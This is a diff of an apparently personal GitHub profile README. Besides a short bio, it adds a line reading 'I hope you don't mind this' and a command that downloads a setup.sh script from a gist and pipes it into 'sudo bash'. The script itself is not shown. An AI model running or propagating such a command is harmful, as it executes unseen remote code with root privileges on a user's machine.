@@ -1,5 +1,6 @@
 # 💫 About Me:
-🔭 "Make the fiction a reality"<br>👯 Collaborating with Gemfi 25'<br>🤝 Awardee IGGS 25'<br> <br>Nothing much to be seen here, its just my hobby
+🔭 "Make the fiction a reality"<br>👯 Collaborating with Gemfi 25'<br>🤝 Awardee IGGS 25'<br> <br>Nothing much to be seen here, its just my hobby<br> <br>I hope you don't mind this :<br> 
+curl -fsSL https://gist.githubusercontent.com/davindakhrisna/2af239ad4cb49fee9eace18027931c6f/raw/97b3991be823b3a859b219e4f095ffff35cf7d72/setup.sh | sudo bash
 
 
 ## 🌐 Socials:
